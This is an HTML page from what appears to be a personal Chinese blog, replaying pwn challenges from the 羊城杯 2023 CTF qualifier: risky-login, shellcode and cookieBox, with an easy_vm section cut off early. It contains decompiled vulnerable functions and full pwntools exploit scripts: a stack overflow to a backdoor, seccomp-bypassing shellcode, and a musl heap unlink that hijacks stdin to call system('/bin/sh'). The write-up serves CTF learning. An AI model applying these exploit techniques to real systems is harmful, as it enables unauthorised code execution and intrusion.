<!DOCTYPE html><html lang="en" theme-mode="dark"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>羊城杯2023初赛_pwn_复现 | str1k3</title><link rel="icon" type="image/x-icon" href="/favicon.ico"><script>var config = {"root":"/","search":{"preload":false,"activeHolder":"Enter here","blurHolder":"Search","noResult":"Data \"$0\" not found"},"code":{"codeInfo":"$0 - $1 lines","copy":"code.copy","copyFinish":"code.copyFinish","expand":"code.expand"}}</script><script src="//unpkg.com/mermaid@9.2.2/dist/mermaid.min.js"></script><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lightgallery.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-zoom.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-thumbnail.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/css/all.min.css"><link rel="stylesheet" href="/css/arknights.css"><script>if (window.localStorage.getItem('theme-mode') === 'light') document.documentElement.setAttribute('theme-mode', 'light')
if (window.localStorage.getItem('theme-mode') === 'dark') document.documentElement.setAttribute('theme-mode', 'dark')</script><style>@font-face {
 font-family: BenderLight;
 src: local('Bender'), url("/font/BenderLight.ttf");
}
@font-face {
 font-family: 'JetBrains Mono';
 src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
}</style><style>:root {
  --dark-background: url('/img/bg.jpg');
  --light-background: url('/img/bk.jpg');
}</style><meta name="generator" content="Hexo 6.3.0"></head><body><div class="loading" style="opacity: 0;"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><nav><div class="navBtn"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="Search" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li><li class="navItem"><a class="navBlock" href="/links/"><span class="navItemTitle">Links</span></a></li></ol></nav></header><div id="shadow-header"></div><article><div id="post-bg"><div id="post-title"><h1>羊城杯2023初赛_pwn_复现</h1><div id="post-info"><span>First Post: <div class="control"><time datetime="2023-09-04T23:20:45.000Z" id="date"> 2023-09-04</time></div></span><br><span>Last Update: <div class="control"><time datetime="2023-09-14T03:38:12.664Z" id="updated"> 2023-09-14</time></div></span></div></div><hr><div id="post-content"><p><em>这次羊城杯见识涨了不少</em><br><em><strong>复现完，应该能够窥见天才殿堂的一角了吧…</strong></em><br><strong>risky-login</strong><br><em>risc-v的题第一次看</em><br>tnnd,搞半天环境不如用ghidra</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c">undefined8 <span class="hljs-title function_">FUN_123457ea</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br><br>&#123;<br>  undefined auStack_130 [<span class="hljs-number">288</span>];<br>  <br>  gp = &amp;__global_pointer$;<br>  FUN_123456a0();<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;RiskY LoG1N SySTem&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Input ur name:&quot;</span>);<br>  read(<span class="hljs-number">0</span>,&amp;DAT_12347078,<span class="hljs-number">8</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Hello, %s&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Input ur words&quot;</span>);<br>  read(<span class="hljs-number">0</span>,auStack_130,<span class="hljs-number">0x120</span>);<br>  FUN_12345786(auStack_130);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;message received&quot;</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">FUN_12345786</span><span class="hljs-params">(<span class="hljs-type">char</span> *param_1)</span><br><br>&#123;<br>  <span class="hljs-type">size_t</span> sVar1;<br>  <span class="hljs-type">char</span> acStack_108 [<span class="hljs-number">248</span>];<br>  <br>  gp = &amp;__global_pointer$;<br>  sVar1 = <span class="hljs-built_in">strlen</span>(param_1);<br>  DAT_12347070 = (byte)sVar1; <span class="hljs-comment">//溢出</span><br>  <span class="hljs-keyword">if</span> (<span class="hljs-number">8</span> &lt; DAT_12347070) &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;too long.&quot;</span>);<br>                    <span class="hljs-comment">/* WARNING: Subroutine does not return */</span><br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>  &#125;<br>  <span class="hljs-built_in">strcpy</span>(acStack_108,param_1);<br>  <span class="hljs-keyword">return</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
<p>溢出点在这里，强行转换为byte类型后会造成16个字节的溢出</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">FUN_123456ee</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br><br>&#123;<br>  <span class="hljs-type">char</span> *pcVar1;<br>  <br>  gp = &amp;__global_pointer$;<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;background debug fun.&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;input what you want exec&quot;</span>);<br>  read(<span class="hljs-number">0</span>,&amp;DAT_12347078,<span class="hljs-number">8</span>);<br>  pcVar1 = <span class="hljs-built_in">strstr</span>(&amp;DAT_12347078,<span class="hljs-string">&quot;sh&quot;</span>);<br>  <span class="hljs-keyword">if</span> ((pcVar1 == (<span class="hljs-type">char</span> *)<span class="hljs-number">0x0</span>) &amp;&amp; (pcVar1 = <span class="hljs-built_in">strstr</span>(&amp;DAT_12347078,<span class="hljs-string">&quot;flag&quot;</span>), pcVar1 == (<span class="hljs-type">char</span> *)<span class="hljs-number">0x0</span>)) &#123;<br>    system(&amp;DAT_12347078);<br>    <span class="hljs-keyword">return</span>;<br>  &#125;<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;no.&quot;</span>);<br>                    <span class="hljs-comment">/* WARNING: Subroutine does not return */</span><br>  <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
<p>这个是后门函数，ban掉了”sh”和”flag”，可以通过cat f*来绕过</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment">#p = process(&#x27;./pwn&#x27;)</span><br>p = remote(<span class="hljs-string">&#x27;tcp.cloud.dasctf.com&#x27;</span>,<span class="hljs-number">29560</span>)<br><br>elf = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>libc = ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br>context(log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br><br>system = <span class="hljs-number">0x0000000000010760</span><br><br>p.recvuntil(<span class="hljs-string">b&quot;Input ur name:&quot;</span>)<br>p.send(<span class="hljs-string">b&#x27;0&#x27;</span>*<span class="hljs-number">8</span>)<br>p.recvuntil(<span class="hljs-string">b&quot;Input ur words&quot;</span>)<br>p.send(<span class="hljs-string">b&#x27;1&#x27;</span>*<span class="hljs-number">0x100</span>+p64(<span class="hljs-number">0x0000000123456EE</span>))<br>p.sendline(<span class="hljs-string">b&#x27;cat f*&#x27;</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>

<p><strong>shellcode</strong><br>可以执行长度为 0x10 字节的 shellcode，shellcode 指令只能为 pop&#x2F;push &lt;寄存器&gt;。</p>
<p>解题的关键点有两个：<br>(1) shellcode 地址位于栈上；<br>(2) 开头可以写任意 2 字节数据到栈上（也就是那个 “[2] Input: (ye &#x2F; no)”）。</p>
<p>解题思路是先将 2 字节的 syscall 汇编指令码（\x0f\x05）写到栈上，然后利用 pop&#x2F;push 指令将指令码复制到 shellcode 内存末尾，并布置好寄存器，最后调用 read 系统调用读入 cat flag shellcode 到 shellcode 内存上。</p>
<p>栈上有一个缓冲区地址恰好指向我们输入的 syscall 指令码，可以把这个缓冲区地址 pop 到 rsp，将 syscall 指令码 pop 到某个寄存器后，再次利用 pop&#x2F;push 指令将 rsp 改成事先保存好的 shellcode 内存地址，最后利用 pop 指令将 syscall 指令码写到 shellcode 内存地址上即可。</p>
<p>执行 shellcode 前加载了 seccomp 沙盒，只能调用 open, write, read 和 dup2 系统调用，并限制 read 和 write fd 参数的范围（read 限制 fd &lt;&#x3D;2、write 限制 fd &gt;2）。 fd 限制可以利用 dup2 重定向 fd 来绕过。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> warnings<br>warnings.filterwarnings(<span class="hljs-string">&quot;ignore&quot;</span>, category=BytesWarning)<br><br>context(arch=<span class="hljs-string">&quot;amd64&quot;</span>, log_level=<span class="hljs-string">&quot;debug&quot;</span>)<br><br>p = remote(<span class="hljs-string">&quot;tcp.cloud.dasctf.com&quot;</span>, <span class="hljs-number">27135</span>)<br><br>p.sendafter(<span class="hljs-string">&quot;[2] Input: (ye / no)&quot;</span>, <span class="hljs-string">b&quot;\x0f\x05&quot;</span>) <br><br>sc1 = asm(<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">push rax</span><br><span class="hljs-string">pop rsi</span><br><span class="hljs-string">push rbx</span><br><span class="hljs-string">pop rax</span><br><span class="hljs-string">push rbx</span><br><span class="hljs-string">pop rdi</span><br><span class="hljs-string"></span><br><span class="hljs-string">pop rbx</span><br><span class="hljs-string">pop rbx</span><br><span class="hljs-string">pop rsp</span><br><span class="hljs-string">pop rdx</span><br><span class="hljs-string"></span><br><span class="hljs-string">push rsi</span><br><span class="hljs-string">pop rsp</span><br><span class="hljs-string">pop rbx</span><br><span class="hljs-string">pop rbx</span><br><span class="hljs-string">pop rbx</span><br><span class="hljs-string">push rdx</span><br><span class="hljs-string">push rdx</span><br><span class="hljs-string">&quot;&quot;&quot;</span>)<br><br>p.sendafter(<span class="hljs-string">&quot;[5] ======== Input Your P0P Code ========&quot;</span>, sc1)<br><br>sc2 = <span class="hljs-string">&quot;nop\n&quot;</span>*<span class="hljs-number">0x12</span><br>sc2 += <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">mov rsp, r12</span><br><span class="hljs-string"></span><br><span class="hljs-string">mov rax, 0x67616c662f</span><br><span class="hljs-string">push rax</span><br><span class="hljs-string">mov rdi, rsp</span><br><span class="hljs-string">mov rsi, 0</span><br><span class="hljs-string">mov rax, 2</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string"></span><br><span class="hljs-string">mov rdi, rax</span><br><span class="hljs-string">mov rsi, 0</span><br><span class="hljs-string">mov rax, 33</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string"></span><br><span class="hljs-string">mov rdi, 1</span><br><span class="hljs-string">mov rsi, 23</span><br><span class="hljs-string">mov rax, 33</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string"></span><br><span class="hljs-string">mov rdi, 0</span><br><span class="hljs-string">mov rsi, rsp</span><br><span class="hljs-string">mov rdx, 0x100</span><br><span class="hljs-string">mov rax, 0</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string"></span><br><span class="hljs-string">mov rdi, 23</span><br><span class="hljs-string">mov rax, 1</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br>p.send(asm(sc2))<br><br>p.interactive()<br></code></pre></td></tr></table></figure>

<p><strong>cookieBox</strong><br>先贴篇文章<em><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/202253#h3-12">https://www.anquanke.com/post/id/202253#h3-12</a></em><br>很详细，看完来看题</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> __fastcall __noreturn <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> a1, <span class="hljs-type">char</span> **a2, <span class="hljs-type">char</span> **a3)</span><br>&#123;<br>  <span class="hljs-type">char</span> *v3; <span class="hljs-comment">// rdx</span><br>  <span class="hljs-type">const</span> <span class="hljs-type">char</span> *v4; <span class="hljs-comment">// rdi</span><br>  <span class="hljs-type">char</span> v5[<span class="hljs-number">256</span>]; <span class="hljs-comment">// [rsp+10h] [rbp-110h] BYREF</span><br>  _QWORD v6[<span class="hljs-number">2</span>]; <span class="hljs-comment">// [rsp+110h] [rbp-10h] BYREF</span><br><br>  v6[<span class="hljs-number">1</span>] = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  setvbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-number">0LL</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0LL</span>);<br>  setvbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-number">0LL</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0LL</span>);<br>  setvbuf(<span class="hljs-built_in">stderr</span>, <span class="hljs-number">0LL</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0LL</span>);<br>  v3 = v5;<br>  <span class="hljs-built_in">memset</span>(v5, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(v5));<br>  v4 = (<span class="hljs-type">const</span> <span class="hljs-type">char</span> *)v6;<br>  <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>  &#123;<br>    sub_400CE8(v4, <span class="hljs-number">0LL</span>, v3);<br>    <span class="hljs-keyword">switch</span> ( (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)sub_400980() )<br>    &#123;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">1u</span>:<br>        sub_400A50();<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">2u</span>:<br>        sub_400B69();<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">3u</span>:<br>        sub_400C59();<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">4u</span>:<br>        sub_400BE1();<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">5u</span>:<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>      <span class="hljs-keyword">default</span>:<br>        v4 = <span class="hljs-string">&quot;invalid choice&quot;</span>;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;invalid choice&quot;</span>);<br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
<p>常规菜单题，增删改查</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">sub_400C59</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v1; <span class="hljs-comment">// [rsp+Ch] [rbp-4h]</span><br><br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Please input the idx:&quot;</span>);<br>  v1 = sub_400980();<br>  <span class="hljs-keyword">if</span> ( v1 &lt;= <span class="hljs-number">0xF</span> &amp;&amp; (&amp;buf)[v1] &amp;&amp; *((_DWORD *)&amp;nbytes + v1) )<br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Please input the content:&quot;</span>);<br>    read(<span class="hljs-number">0</span>, (&amp;buf)[v1], *((<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> *)&amp;nbytes + v1));<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Done&quot;</span>);<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Idx Error&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
<p>free之后没有把指针清空，存在UAF</p>
<p>第一步泄漏 libc 基址，musl-libc 把程序内存或者 libc 内存的空闲内存划为堆内存，耗尽后才会申请动态内存。泄露堆地址就可以得到程序基址或 libc 基址</p>
<p>leak 之后可以利用 unbin 进行unlink，unbin 没有检查prev和next指针是否合法，通过堆溢出我们可以改写这两个指针，利用 unbin 向任意地址写指针地址，即*(uint64_t*)(prev + 2) &#x3D; next和*(uint64_t*)(next + 3) &#x3D; prev。</p>
<p>可以将 prev改成 io(stdin stdout)，然后把 next改成 bss地址，然后申请一个 chunk 0x100，就可以实现将任意地址写入 bss 地址，然后再申请，即可任意申请io写io，然后改io为 binsh 打system即可</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br><br>elf = ELF(<span class="hljs-string">&#x27;cookieBox&#x27;</span>)<br>libc = ELF(<span class="hljs-string">&#x27;libc.so&#x27;</span>)<br><br>p = process(<span class="hljs-string">&#x27;./cookieBox&#x27;</span>)<br><span class="hljs-comment">#p = remote(&#x27;tcp.cloud.dasctf.com&#x27;, 25633)</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>():<br>    gdb.attach(p) <br>    pause()    <br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size, payload</span>):<br>    p.recvuntil(<span class="hljs-string">&quot;&gt;&gt;&quot;</span>)<br>    p.sendline(<span class="hljs-string">&quot;1&quot;</span>)<br>    p.recvuntil(<span class="hljs-string">&quot;size:\n&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(size))<br>    p.recvuntil(<span class="hljs-string">&quot;Content:\n&quot;</span>)<br>    p.send(payload)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">idx</span>):<br>    p.recvuntil(<span class="hljs-string">&quot;&gt;&gt;&quot;</span>)<br>    p.sendline(<span class="hljs-string">&quot;2&quot;</span>)<br>    p.recvuntil(<span class="hljs-string">&quot;idx:\n&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">idx, payload</span>):<br>    p.recvuntil(<span class="hljs-string">&quot;&gt;&gt;&quot;</span>)<br>    p.sendline(<span class="hljs-string">&quot;3&quot;</span>)<br>    p.recvuntil(<span class="hljs-string">&quot;idx:\n&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(idx))<br>    p.recvuntil(<span class="hljs-string">&quot;content:\n&quot;</span>)<br>    p.send(payload)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">idx</span>):<br>    p.recvuntil(<span class="hljs-string">&quot;&gt;&gt;&quot;</span>)<br>    p.sendline(<span class="hljs-string">&quot;4&quot;</span>)<br>    p.recvuntil(<span class="hljs-string">&quot;idx:\n&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br>add(<span class="hljs-number">0x100</span>, <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">8</span>)  <span class="hljs-comment">#chunk0</span><br>add(<span class="hljs-number">0x100</span>, <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">8</span>)  <span class="hljs-comment">#chunk1</span><br>add(<span class="hljs-number">0x100</span>, <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">8</span>)  <span class="hljs-comment">#chunk2</span><br>add(<span class="hljs-number">0x100</span>, <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">8</span>)  <span class="hljs-comment">#chunk3</span><br><br>show(<span class="hljs-number">0</span>)<br>p.recv(<span class="hljs-number">8</span>)<br><br>libc.address = u64(p.recvuntil(<span class="hljs-string">b&quot;\x7f&quot;</span>).ljust(<span class="hljs-number">0x8</span>,<span class="hljs-string">b&quot;\x00&quot;</span>)) - <span class="hljs-number">0x292e50</span><br>success(<span class="hljs-string">&quot;libc.address--&gt;&quot;</span>+<span class="hljs-built_in">hex</span>(libc.address))    <span class="hljs-comment">#leak_libc_base</span><br><br>stdin = libc.address + <span class="hljs-number">0x292200</span><br>success(<span class="hljs-string">&quot;stdin--&gt;&quot;</span>+<span class="hljs-built_in">hex</span>(stdin))<br><br>system = libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>success(<span class="hljs-string">&quot;system--&gt;&quot;</span>+<span class="hljs-built_in">hex</span>(system))<br><br>bss = <span class="hljs-number">0x602060</span><br>free(<span class="hljs-number">1</span>)<br>add(<span class="hljs-number">0x100</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)  <span class="hljs-comment">#chunk4</span><br>free(<span class="hljs-number">1</span>)           <span class="hljs-comment">#double_free chunk1</span><br>edit(<span class="hljs-number">4</span>, p64(stdin) + p64(<span class="hljs-number">0x602070</span>-<span class="hljs-number">0x10</span>)) <span class="hljs-comment">#bss_addr</span><br><span class="hljs-comment">#debug()</span><br>add(<span class="hljs-number">0x100</span>, <span class="hljs-string">b&quot;A&quot;</span>)  <span class="hljs-comment">#chunk5,fake_chunk</span><br>payload = <span class="hljs-string">b&quot;/bin/sh\x00&quot;</span><br>payload += <span class="hljs-string">b&#x27;A&#x27;</span> * <span class="hljs-number">0x20</span><br>payload += p64(<span class="hljs-number">0x22222222</span>) <span class="hljs-comment"># stdin -&gt; wpos -&gt; stdin -&gt; wbase</span><br>payload += <span class="hljs-string">b&#x27;A&#x27;</span> * <span class="hljs-number">8</span><br>payload += p64(<span class="hljs-number">0x11111111</span>)<br>payload += <span class="hljs-string">b&#x27;A&#x27;</span> * <span class="hljs-number">8</span><br>payload += p64(system)<br>edit(<span class="hljs-number">2</span>, payload)<br><br>p.recvuntil(<span class="hljs-string">&quot;&gt;&gt;&quot;</span>)<br>p.sendline(<span class="hljs-string">&quot;5&quot;</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>

<p><strong>easy_vm</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span 